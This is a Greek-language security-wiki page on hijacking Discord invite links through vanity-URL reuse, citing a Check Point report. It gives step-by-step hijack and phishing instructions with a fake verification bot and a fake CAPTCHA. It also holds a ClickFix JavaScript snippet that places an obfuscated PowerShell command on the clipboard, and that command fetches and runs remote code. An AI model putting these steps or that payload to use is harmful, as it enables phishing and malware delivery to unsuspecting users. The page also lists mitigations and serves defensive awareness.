# Hijacking Προσκλήσεων Discord

{{#include ../../banners/hacktricks-training.md}}

Το Discord invite hijacking εκμεταλλεύεται τους κανόνες επαναχρησιμοποίησης των custom vanity links: ένας ληγμένος προσωρινός invite code ή ένας διαγραμμένος μόνιμος code που αποτελείται μόνο από πεζά γράμματα και ψηφία μπορεί να καταχωριστεί ως vanity link σε server με Level 3 Boost. Ένα custom vanity link μπορεί επίσης να γίνει διαθέσιμο όταν ο αρχικός server χάσει το Level 3 Boost του· για έναν προσωρινό invite με κεφαλαία γράμματα, ένας attacker μπορεί να προ-καταχωρίσει τη vanity μορφή με πεζά γράμματα όσο ο κανονικός invite παραμένει ενεργός, αλλά η ανακατεύθυνση ξεκινά μόνο αφού λήξει αυτός ο invite.<sup>[[1]](#references)[[2]](#references)</sup>

## Τύποι Invite και Κίνδυνος Hijacking

Ο παρατηρούμενος κίνδυνος διαφέρει ανάλογα με τον τύπο invite:<sup>[[1]](#references)[[2]](#references)</sup>

| Τύπος Invite           | Μπορεί να γίνει Hijack; | Προϋπόθεση / Σχόλια                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Προσωρινό Invite Link | ✅          | Μετά τη λήξη του, ο code γίνεται διαθέσιμος και μπορεί να επανεγγραφεί ως vanity URL από έναν boosted server. |
| Μόνιμο Invite Link | ⚠️          | Αν διαγραφεί και αποτελείται μόνο από πεζά γράμματα και ψηφία, ο code μπορεί να γίνει ξανά διαθέσιμος.        |
| Custom Vanity Link    | ✅          | Αν ο αρχικός server χάσει το Level 3 Boost του, το vanity invite του γίνεται διαθέσιμο για νέα καταχώριση.    |

## Βήματα Exploitation

1. Reconnaissance
- Παρακολουθήστε δημόσιες πηγές (forums, social media, Telegram channels) για invite links που αντιστοιχούν στο μοτίβο `discord.gg/{code}` ή `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Συλλέξτε invite codes που σας ενδιαφέρουν (προσωρινούς ή vanity).<sup>[[1]](#references)</sup>
2. Pre-registration
- Δημιουργήστε ή χρησιμοποιήστε έναν υπάρχοντα Discord server με δικαιώματα Level 3 Boost.<sup>[[1]](#references)[[2]](#references)</sup>
- Στο **Server Settings → Vanity URL**, προσπαθήστε να ορίσετε τον invite code-στόχο. Αν γίνει αποδεκτός, ο code δεσμεύεται από τον malicious server.<sup>[[1]](#references)</sup>
3. Ενεργοποίηση Hijack
- Για προσωρινούς invites, περιμένετε μέχρι να λήξει ο αρχικός invite (ή διαγράψτε τον χειροκίνητα αν ελέγχετε την πηγή).<sup>[[1]](#references)</sup>
- Για codes που περιέχουν κεφαλαία γράμματα, η παραλλαγή με πεζά γράμματα μπορεί να γίνει claim αμέσως, αν και η ανακατεύθυνση ενεργοποιείται μόνο μετά τη λήξη.<sup>[[1]](#references)</sup>
4. Αθόρυβη Ανακατεύθυνση
- Οι χρήστες που επισκέπτονται το παλιό link μεταφέρονται απρόσκοπτα στον server που ελέγχεται από τον attacker μόλις ενεργοποιηθεί το hijack.<sup>[[1]](#references)</sup>

## Phishing Flow μέσω Discord Server

1. Περιορίστε τα channels του server, ώστε να είναι ορατό μόνο ένα **#verify** channel.<sup>[[1]](#references)</sup>
2. Αναπτύξτε ένα bot (π.χ. **Safeguard#0786**) για να ζητά από τους νεοεισερχόμενους να κάνουν verify μέσω OAuth2.<sup>[[1]](#references)</sup>
3. Το bot ανακατευθύνει τους χρήστες σε phishing site (π.χ. `captchaguard.me`) με πρόσχημα ένα CAPTCHA ή ένα βήμα verification.<sup>[[1]](#references)</sup>
4. Υλοποιήστε το τέχνασμα UX **ClickFix**:<sup>[[1]](#references)</sup>
- Εμφανίστε ένα μήνυμα για κατεστραμμένο CAPTCHA.
- Καθοδηγήστε τους χρήστες να ανοίξουν το παράθυρο διαλόγου **Win+R**, να επικολλήσουν μια προφορτωμένη εντολή PowerShell και να πατήσουν Enter.

### Παράδειγμα Έγχυσης στο Clipboard μέσω ClickFix

Η καμπάνια χρησιμοποίησε JavaScript για να αντιγράψει μια κακόβουλη εντολή PowerShell στο clipboard:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Αυτή η προσέγγιση αποφεύγει τις άμεσες λήψεις αρχείων και αξιοποιεί οικεία στοιχεία UI για να μειώσει την υποψία των χρηστών.<sup>[[1]](#references)</sup>

## Mitigations

- Προτιμήστε μόνιμα invite links και βεβαιωθείτε ότι ο κωδικός περιέχει τουλάχιστον ένα κεφαλαίο γράμμα· οι διαγραμμένοι μόνιμοι κωδικοί που περιέχουν κεφαλαία γράμματα δεν μπορούν να επαναχρησιμοποιηθούν ως vanity links.<sup>[[1]](#references)</sup>
- Περιστρέφετε τακτικά τους κωδικούς invite και ανακαλείτε τα παλιά links.
- Παρακολουθείτε την κατάσταση boost του Discord server και τις διεκδικήσεις vanity URL.<sup>[[1]](#references)[[2]](#references)</sup>
- Εκπαιδεύστε τους χρήστες να επαληθεύουν τη γνησιότητα του server και να αποφεύγουν την εκτέλεση εντολών που έχουν γίνει paste από το clipboard.

## References

- [1] [Από την εμπιστοσύνη στην απειλή: Hijacked Discord Invites που χρησιμοποιούνται για Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Υποστήριξη Discord](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
